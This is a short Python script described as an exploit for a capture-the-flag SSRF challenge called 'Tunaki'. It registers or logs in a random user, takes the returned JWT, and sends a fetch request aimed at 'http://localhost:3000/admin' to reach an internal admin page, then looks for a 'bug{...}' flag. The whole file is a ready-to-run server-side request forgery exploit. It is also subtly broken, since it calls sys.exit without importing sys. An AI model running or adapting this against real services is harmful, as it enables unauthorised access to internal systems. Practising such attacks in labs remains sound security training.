import requests
import argparse
import random
import string
import re

parser = argparse.ArgumentParser(
    prog='Tunaki',
    description='Python exploit script for Tunaki SSRF challenge',
    epilog='Thank you!!!'
)

parser.add_argument('--url', help="Target base url (e.g. https://target.com)", required=True)
args = parser.parse_args()

base_url = args.url.rstrip("/")
register_url = f"{base_url}/api/register"
login_url = f"{base_url}/api/login"
fetch_url = f"{base_url}/api/fetch"

# Create session (stores cookies automatically)
session = requests.Session()

def random_string(length=6):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

username = f"user_{random_string()}"
password = "P@ssw0rd123!@#$%^&*!"
email = f"{username}@mail.com"

headers = {
    "Content-Type": "application/json",
    "Accept": "application/json"
}

print(f"[*] Trying to register user: {username}")
register_data = {
    "username": username,
    "email": email,
    "password": password,
    "full_name": username
}

r = session.post(register_url, json=register_data, headers=headers)

# If registration fails (user exists), try login
if r.status_code != 200:
    print("[*] Registration failed, attempting login...")
    login_data = {
        "username": username,
        "password": password
    }
    r = session.post(login_url, json=login_data, headers=headers)

    if r.status_code != 200:
        print("[-] Login failed")
        print(r.text)
        sys.exit()

else:
    print("[+] Registration successful")

# Extract JWT token
try:
    token = r.json().get("token")
except Exception:
    print("[-] Could not extract token")
    sys.exit()

if not token:
    print("[-] No token received")
    sys.exit()

print("[+] Access token obtained")

# Store Access token 
session.headers.update({
    "Authorization": f"Bearer {token}"
})

print("[*] Sending SSRF payload...")

payload = {
    "url": "http://localhost:3000/admin"
}

resp = session.post(fetch_url, json=payload)

print("=" * 180)
print(resp.text)
print("=" * 180)

flag_match = re.search(r'bug\{.*?\}', resp.text)
